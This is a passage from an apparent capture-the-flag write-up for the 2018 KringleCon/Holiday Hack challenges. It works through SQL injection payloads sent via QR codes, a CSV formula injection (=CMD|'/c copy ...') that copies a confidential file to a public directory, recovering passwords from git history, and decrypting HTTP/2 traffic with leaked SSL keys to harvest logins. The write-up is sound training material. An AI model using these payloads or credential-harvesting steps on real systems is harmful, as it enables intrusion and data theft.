</code></pre><p>If the barcode is not properly formatted:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>HTTP/<span style=color:#2aa198>1.1</span> <span style=color:#2aa198>200</span> OK
</span></span><span style=display:flex><span>Server: nginx/<span style=color:#2aa198>1.10</span>.<span style=color:#2aa198>3</span>
</span></span><span style=display:flex><span>Date: Sun, <span style=color:#2aa198>30</span> Dec <span style=color:#2aa198>2018</span> <span style=color:#2aa198>04</span>:<span style=color:#2aa198>32</span>:<span style=color:#2aa198>50</span> GMT
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>Content-Length: <span style=color:#2aa198>151</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{<span style=color:#268bd2>&#34;data&#34;</span>:<span style=color:#2aa198>&#34;EXCEPTION AT (LINE 135 
</span></span></span><span style=display:flex><span><span style=color:#2aa198>    \&#34;temp_file.write(base64.b64decode(request.form[&#39;b64barcode&#39;].split(&#39;,&#39;)[-1]))\&#34;):
</span></span></span><span style=display:flex><span><span style=color:#2aa198>    Incorrect padding&#34;</span>,<span style=color:#268bd2>&#34;request&#34;</span>:<span style=color:#cb4b16>false</span>}
</span></span></code></pre></div><p>Now we if upload a QRcode with payload <code>hello'</code> (note the trailing <code>'</code>), we get this response:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>HTTP/<span style=color:#2aa198>1.1</span> <span style=color:#2aa198>200</span> OK
</span></span><span style=display:flex><span>Server: nginx/<span style=color:#2aa198>1.10</span>.<span style=color:#2aa198>3</span>
</span></span><span style=display:flex><span>Date: Sun, <span style=color:#2aa198>30</span> Dec <span style=color:#2aa198>2018</span> <span style=color:#2aa198>04</span>:<span style=color:#2aa198>32</span>:<span style=color:#2aa198>28</span> GMT
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>Content-Length: <span style=color:#2aa198>363</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{<span style=color:#268bd2>&#34;data&#34;</span>:<span style=color:#2aa198>&#34;EXCEPTION AT (LINE 96 \&#34;user_info = 
</span></span></span><span style=display:flex><span><span style=color:#2aa198>query(\&#34;SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = &#39;{}&#39; LIMIT 1\&#34;.format(uid))\&#34;):
</span></span></span><span style=display:flex><span><span style=color:#2aa198>(1064, u\&#34;You have an error in your SQL syntax; check the manual that corresponds
</span></span></span><span style=display:flex><span><span style=color:#2aa198>to your MariaDB server version for the right syntax to use near &#39;&#39;hello&#39;&#39; LIMIT 1&#39; at line 1\&#34;)&#34;</span>,<span style=color:#268bd2>&#34;request&#34;</span>:<span style=color:#cb4b16>false</span>}
</span></span></code></pre></div><p>We can learn a few things:</p><ul><li>The server is running MariaDB.</li><li>Original SQL query is<ul><li><code>SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1"</code></li></ul></li><li>Payload is injected in the value of <code>uid</code>.</li><li>If the format of the query is correct, we get these responses<ul><li><code>{"data":"Authorized User Account Has Been Disabled!","request":false}</code></li><li><code>{"data":"No Authorized User Account Found!","request":false}</code> I got this for <code>hello' or '1'='1 -- ;</code>.</li></ul></li><li>Remember to pass a whitespace and a char after the comment for MariaDB to count it as a comment. The parser might not count it as a comment until it sees another character after it.</li></ul><h3 id=payload>Payload
<a class=header-link href=#payload><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Try different payloads:</p><ul><li>3.png: <code>hello' OR '1'='1 -- ;</code></li><li>4.png: <code>hello' OR 1=1 -- ;</code></li><li>5.png: <code>hello' AND enabled = 1 OR 1=1 -- ;</code></li><li>6.png: <code>hello' AND enabled = true OR 1=1 -- ;</code> (1 and 0 are aliases for true and false in MariaDB)</li></ul><p>The correct payload is <code>' OR enabled = 1 -- ;</code> because we want an account that is both enabled and authorized.</p><ul><li><code>SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '' OR enabled = 1 -- ; ' LIMIT 1</code></li></ul><p>Response is</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#268bd2>&#34;data&#34;</span>:<span style=color:#2aa198>&#34;User Access Granted - Control number 19880715&#34;</span>,<span style=color:#268bd2>&#34;request&#34;</span>:<span style=color:#cb4b16>true</span>,<span style=color:#268bd2>&#34;success&#34;</span>:
</span></span><span style=display:flex><span>{<span style=color:#268bd2>&#34;hash&#34;</span>:<span style=color:#2aa198>&#34;ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb&#34;</span>,<span style=color:#268bd2>&#34;resourceId&#34;</span>:<span style=color:#2aa198>&#34;false&#34;</span>}}
</span></span></code></pre></div><p><strong>The answer is <code>19880715</code>.</strong> And we are in Santa's secret room.</p><h2 id=yule-log-analysis>Yule Log Analysis
<a class=header-link href=#yule-log-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>The answer is <code>minty.candycane</code>.</strong></p><p>Someone did a password spray and then logged into one account. Find that account based on logs.</p><p>There's an <code>evtx</code> file and a python script to dump it as XML.</p><ul><li><code>python evtx_dump.py ho-ho-no.evtx > dumped</code></li></ul><p>And then I ran <code>cat dumped</code> and copied everything to a local text file on my machine.</p><p>To isolate password sprays, search for <code>4625</code> (event ID for unsuccessful logon). See the nice section in the minimap? That is out password spray.</p><span class=caption-wrapper><img class=caption src=02-pw-spray.png title="Searching for 4625 in VS Code" alt="Searching for 4625 in VS Code">
<span class=caption-text>Searching for 4625 in VS Code</span></span><p>Copy/paste that part to a new file and look for successful logons (<code>4624</code>). There multiple logons in the password spray logs. Which one is the attacker?</p><p>The attacker did the password spray from one IP (or multiple IPs), so logon must be from one of those IPs. All password spray attempts came from <code>172.31.254.101</code>. So we search for a successful logon (<code>4624</code>) from that IP and we find <code>minty.candycane</code>.</p><p>Summary of log entry:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#268bd2>&lt;Event</span>
</span></span><span style=display:flex><span>	xmlns=<span style=color:#2aa198>&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;</span><span style=color:#268bd2>&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&lt;System&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Provider</span> Name=<span style=color:#2aa198>&#34;Microsoft-Windows-Security-Auditing&#34;</span> Guid=<span style=color:#2aa198>&#34;{54849625-5478-4994-a5ba-3e3b0328c30d}&#34;</span><span style=color:#268bd2>&gt;&lt;/Provider&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;TimeCreated</span> SystemTime=<span style=color:#2aa198>&#34;2018-09-10 13:05:03.702278&#34;</span><span style=color:#268bd2>&gt;&lt;/TimeCreated&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;EventRecordID&gt;</span>240171<span style=color:#268bd2>&lt;/EventRecordID&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Correlation</span> ActivityID=<span style=color:#2aa198>&#34;{71a9b66f-4900-0001-a8b6-a9710049d401}&#34;</span> RelatedActivityID=<span style=color:#2aa198>&#34;&#34;</span><span style=color:#268bd2>&gt;&lt;/Correlation&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Computer&gt;</span>WIN-KCON-EXCH16.EM.KRINGLECON.COM<span style=color:#268bd2>&lt;/Computer&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Security</span> UserID=<span style=color:#2aa198>&#34;&#34;</span><span style=color:#268bd2>&gt;&lt;/Security&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&lt;/System&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&lt;EventData&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;SubjectUserName&#34;</span><span style=color:#268bd2>&gt;</span>WIN-KCON-EXCH16$<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;SubjectLogonId&#34;</span><span style=color:#268bd2>&gt;</span>0x00000000000003e7<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;TargetUserSid&#34;</span><span style=color:#268bd2>&gt;</span>S-1-5-21-25059752-1411454016-2901770228-1156<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;TargetUserName&#34;</span><span style=color:#268bd2>&gt;</span>minty.candycane<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;TargetDomainName&#34;</span><span style=color:#268bd2>&gt;</span>EM.KRINGLECON<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;WorkstationName&#34;</span><span style=color:#268bd2>&gt;</span>WIN-KCON-EXCH16<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;LogonGuid&#34;</span><span style=color:#268bd2>&gt;</span>{d1a830e3-d804-588d-aea1-48b8610c3cc1}<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;ProcessName&#34;</span><span style=color:#268bd2>&gt;</span>C:\Windows\System32\inetsrv\w3wp.exe<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;IpAddress&#34;</span><span style=color:#268bd2>&gt;</span>172.31.254.101<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#268bd2>&lt;Data</span> Name=<span style=color:#2aa198>&#34;IpPort&#34;</span><span style=color:#268bd2>&gt;</span>38283<span style=color:#268bd2>&lt;/Data&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#268bd2>&lt;/EventData&gt;</span>
</span></span><span style=display:flex><span><span style=color:#268bd2>&lt;/Event&gt;</span>
</span></span></code></pre></div><hr><h1 id=7-hr-incident-response>7. HR Incident Response
<a class=header-link href=#7-hr-incident-response><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>The answer is <code>Fancy Beaver</code>.</strong></p><h2 id=careers-website>Careers Website
<a class=header-link href=#careers-website><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>CSV payload is:</p><ul><li><code>=CMD|'/c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\myfile.txt'!A1</code></li></ul><p>We need to do CSV injection on <a href=https://careers.kringlecastle.com/ target=_blank rel="noreferrer noopener">https://careers.kringlecastle.com/</a> and access a file.</p><p>To exfiltrate the file, we need to copy it to a publicly accessible URL. We do not need to use our own server, the 404 page gives us the location of a publicly accessible directory along with its internal address.</p><pre tabindex=0><code>Publicly accessible file served from:
C:\careerportal\resources\public\ not found......

Try:
https://careers.kringlecastle.com/public/&#39;file name you are looking for&#39;
</code></pre><p>The following csv file works:</p><pre tabindex=0><code class=language-csv data-lang=csv>111,=CMD|&#39;/c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\myfile.txt&#39;!A1,33
55,44,77
</code></pre><p>Now we can access the file at <code>https://careers.kringlecastle.com/public/myfile.txt</code>, change the extension and view it.</p><p>The answer is <code>Fancy Beaver</code>.</p><h2 id=dev-ops-fail>Dev Ops Fail
<a class=header-link href=#dev-ops-fail><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>The answer is <code>twinkletwinkletwinkle</code>.</strong></p><p>Similar to another challenge, credentials have been committed to git and then overwritten. This time we do not have a nice web interface to view the commits and must use the command line.</p><p><code>kcconfmgmt</code> is a git repo. Either <code>grep -ir password</code> or do <code>git log -10</code> to see the last 10 commit messages.</p><p>Two of the commit messages are:</p><pre tabindex=0><code>commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Thu Nov 8 21:11:03 2018 -0500
    Per @tcoalbox admonishment, removed username/password from config.js, default settings
 in config.js.def need to be updated before use

commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;
Date:   Thu Nov 8 13:25:32 2018 -0500
    Add passport module
</code></pre><p>So the credentials where in <code>config.js</code>. It has been replaced by <code>config.js.def</code> which is clean:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>elf@<span style=color:#2aa198>03</span>a47cb7373b<span style=color:#719e07>:~</span>/kcconfmgmt/server/config$ cat config.js.def 
</span></span><span style=display:flex><span><span style=color:#586e75>// Database URL
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>module.exports <span style=color:#719e07>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#2aa198>&#39;url&#39;</span> <span style=color:#719e07>:</span> <span style=color:#2aa198>&#39;mongodb://username:password@127.0.0.1:27017/node-api&#39;</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>We can just revert to the commit <strong>BEFORE THE OVERWRITE</strong> and look inside that file:</p><ul><li><code>git checkout b2376f4a</code></li></ul><p><code>config.js</code> is now available:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>elf@<span style=color:#2aa198>03</span>a47cb7373b<span style=color:#719e07>:~</span>/kcconfmgmt/server/config$ cat config.js 
</span></span><span style=display:flex><span><span style=color:#586e75>// Database URL
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>module.exports <span style=color:#719e07>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#2aa198>&#39;url&#39;</span> <span style=color:#719e07>:</span> <span style=color:#2aa198>&#39;mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api&#39;</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>The answer is <code>twinkletwinkletwinkle</code>.</p><hr><h1 id=8-network-traffic-forensics>8. Network Traffic Forensics
<a class=header-link href=#8-network-traffic-forensics><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>The answer is <code>Mary Had a Little Lamb</code>.</strong></p><p>Packet capture website is at <a href=https://packalyzer.kringlecastle.com/ target=_blank rel="noreferrer noopener">https://packalyzer.kringlecastle.com/</a>.</p><p>We get hints after completing the Python challenge (solution is below):</p><ul><li>Packalyzer was rushed and deployed with development code sitting in the web root.</li><li>Look at HTML comments left behind to grab the server-side source code.</li><li>There is suspicious-looking development code using environment variables to store SSL keys and open up directories.</li><li>These errors can be used to compromise SSL on the website and steal logins.</li><li>Manipulating values in the URL gave back weird and descriptive errors.</li><li>The HTTP/2 talk has hints. The talk talks about decrypting SSL using Wireshark using extracted keys.</li></ul><p>Make an account and login. Then we can sniff traffic and upload pcaps for analysis. In the <code>Captures</code> tab we can download/reanalyze/delete older pcaps.</p><p>Comments in code show the the name of source file:</p><ul><li><code>//File upload Function. All extensions and sizes are validated server-side in app.js</code></li></ul><p>Web root can be discovered by looking at asset URLs. They are all under <code>pub</code>. So <code>app.js</code> is at:</p><ul><li><a href=https://packalyzer.kringlecastle.com/pub/app.js target=_blank rel="noreferrer noopener">https://packalyzer.kringlecastle.com/pub/app.js</a></li></ul><p>Weird and descriptive error looks like this:</p><ul><li>Access: <a href=https://packalyzer.kringlecastle.com/uploads/nem,.rxr target=_blank rel="noreferrer noopener">https://packalyzer.kringlecastle.com/uploads/nem,.rxr</a></li><li><code>Error: ENOENT: no such file or directory, open '/opt/http2/uploads//nem,.rxr'</code></li></ul><h2 id=appjs-analysis>app.js Analysis
<a class=header-link href=#appjs-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Look at <code>load_envs</code>, they are opening up directories based on <strong>names</strong> of environmental variables. It was a common mistake to think they are based on values but they are just grabbing keys (<code>Object.keys</code>).</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#268bd2>function</span> load_envs() {
</span></span><span style=display:flex><span>  <span style=color:#268bd2>var</span> dirs <span style=color:#719e07>=</span> []
</span></span><span style=display:flex><span>  <span style=color:#268bd2>var</span> env_keys <span style=color:#719e07>=</span> <span style=color:#b58900>Object</span>.keys(process.env)
</span></span><span style=display:flex><span>  <span style=color:#719e07>for</span> (<span style=color:#268bd2>var</span> i<span style=color:#719e07>=</span><span style=color:#2aa198>0</span>; i <span style=color:#719e07>&lt;</span> env_keys.length; i<span style=color:#719e07>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#719e07>if</span> (<span style=color:#719e07>typeof</span> process.env[env_keys[i]] <span style=color:#719e07>===</span> <span style=color:#2aa198>&#34;string&#34;</span> ) {
</span></span><span style=display:flex><span>      dirs.push(( <span style=color:#2aa198>&#34;/&#34;</span><span style=color:#719e07>+</span>env_keys[i].toLowerCase()<span style=color:#719e07>+</span><span style=color:#2aa198>&#39;/*&#39;</span>) )
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#719e07>return</span> uniqueArray(dirs)
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>And they are used to open directories (remember we are in <code>dev_mode</code>):</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#719e07>if</span> (dev_mode) {
</span></span><span style=display:flex><span>    <span style=color:#586e75>//Can set env variable to open up directories during dev
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>    <span style=color:#268bd2>const</span> env_dirs <span style=color:#719e07>=</span> load_envs();
</span></span><span style=display:flex><span>} <span style=color:#719e07>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#268bd2>const</span> env_dirs <span style=color:#719e07>=</span> [<span style=color:#2aa198>&#39;/pub/&#39;</span>,<span style=color:#2aa198>&#39;/uploads/&#39;</span>];
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=sslkeylogfile>SSLKEYLOGFILE
<a class=header-link href=#sslkeylogfile><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>We can go to:</p><ul><li><a href=https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/ target=_blank rel="noreferrer noopener">https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/</a></li></ul><p>And see the name of the <code>SSLKEYLOGFILE</code> environmental variable:</p><ul><li><code>Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/'</code></li></ul><p>But that is not the file name. It is, but not all of it. Again it was a common mistake on Discord to think <code>http2packalyzer_clientrandom_ssl.log/</code> is the file name. The file is formatted neatly by separating different words with underscores BUT in the beginning, two words are mashed together unceremonially. <code>http2</code> is part of the error message as we have seen before. The value is:</p><ul><li><code>packalyzer_clientrandom_ssl.log</code></li></ul><p>The complete path to the log file is inside <code>app.js</code>:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#268bd2>const</span> dev_mode <span style=color:#719e07>=</span> <span style=color:#cb4b16>true</span>;
</span></span><span style=display:flex><span><span style=color:#268bd2>const</span> key_log_path <span style=color:#719e07>=</span> ( <span style=color:#719e07>!</span>dev_mode <span style=color:#719e07>||</span> __dirname <span style=color:#719e07>+</span> process.env.DEV <span style=color:#719e07>+</span> process.env.SSLKEYLOGFILE )
</span></span><span style=display:flex><span><span style=color:#268bd2>const</span> options <span style=color:#719e07>=</span> {
</span></span><span style=display:flex><span>  key<span style=color:#719e07>:</span> fs.readFileSync(__dirname <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;/keys/server.key&#39;</span>),
</span></span><span style=display:flex><span>  cert<span style=color:#719e07>:</span> fs.readFileSync(__dirname <span style=color:#719e07>+</span> <span style=color:#2aa198>&#39;/keys/server.crt&#39;</span>),
</span></span><span style=display:flex><span>  http2<span style=color:#719e07>:</span> {
</span></span><span style=display:flex><span>    protocol<span style=color:#719e07>:</span> <span style=color:#2aa198>&#39;h2&#39;</span>,         <span style=color:#586e75>// HTTP2 only. NOT HTTP1 or HTTP1.1
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>    protocols<span style=color:#719e07>:</span> [ <span style=color:#2aa198>&#39;h2&#39;</span> ],
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  keylog <span style=color:#719e07>:</span> key_log_path     <span style=color:#586e75>//used for dev mode to view traffic. Stores a few minutes worth at a time
</span></span></span></code></pre></div><p>Let's break down <code>__dirname + process.env.DEV + process.env.SSLKEYLOGFILE</code>.</p><ul><li><code>__dirname</code> is the current directory of the module.<ul><li><a href=https://nodejs.org/docs/latest/api/modules.html#modules_dirname target=_blank rel="noreferrer noopener">https://nodejs.org/docs/latest/api/modules.html#modules_dirname</a></li></ul></li><li><code>process.env.DEV</code> is just <code>DEV</code>. If you were a developer you would have set the value of <code>DEV</code> to <code>true</code> or just <code>DEV</code>.</li></ul><p>Meaning the path is:</p><ul><li><a href=https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log target=_blank rel="noreferrer noopener">https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log</a></li></ul><p>We see a bunch of keys. Remembering the <a href="https://www.youtube.com/watch?v=YHOnxlQ6zec" target=_blank rel="noreferrer noopener">associated Kringlecon talk</a>, it seems they belong to pcaps that are generated by sniffing the traffic for 20 seconds inside the application. The trick is to sniff traffic and then quickly (well within a couple of minutes) get the keys. Now we can decrypt the traffic in Wireshark.</p><p>Inside Wireshark use the filter <code>http2.data.data</code>.</p><p>There does not seem to be a file there but there are multiple username/passwords there. Let's see if we can login as other people and sniff their traffic?</p><p>I tried doing another capture and it was the same. These credentials appear in all sniff captures:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#268bd2>&#34;username&#34;</span>: <span style=color:#2aa198>&#34;pepper&#34;</span>, <span style=color:#268bd2>&#34;password&#34;</span>: <span style=color:#2aa198>&#34;Shiz-Bamer_wabl182&#34;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{<span style=color:#268bd2>&#34;username&#34;</span>: <span style=color:#2aa198>&#34;bushy&#34;</span>, <span style=color:#268bd2>&#34;password&#34;</span>: <span style=color:#2aa198>&#34;Floppity_Floopy-flab19283&#34;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{<span style=color:#268bd2>&#34;username&#34;</span>: <span style=color:#2aa198>&#34;alabaster&#34;</span>, <span style=color:#268bd2>&#34;password&#34;</span>: <span style=color:#2aa198>&#34;Packer-p@re-turntable192&#34;</span>}
</span></span></code></pre></div><p>We can login as <code>alabaster</code>. There's something in his captures, download it and view it in Wireshark. This one is not SSL traffic, we can just read the file. Note the text of the email, it has a hint for later challenges.</p><pre tabindex=0><code>Hey alabaster,

Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.
</code></pre><p>There's a base64 encoded attachment in the TCP stream, we can copy it to a file and decode it.</p><p>Base64 encode decode w/o powershell:</p><pre tabindex=0><code>$ certutil.exe -decode encoded-file.txt decoded-file
Input Length = 132161
Output Length = 97831
CertUtil: -decode command completed successfully.
</code></pre><p>Open it up in a hex editor, it's a PDF (see the header). Seems like it's about the Piano door lock.</p><p>Name of the song is the answer: <code>Mary Had a Little Lamb</code>.</p><h2 id=python-escape-from-la>Python Escape from LA
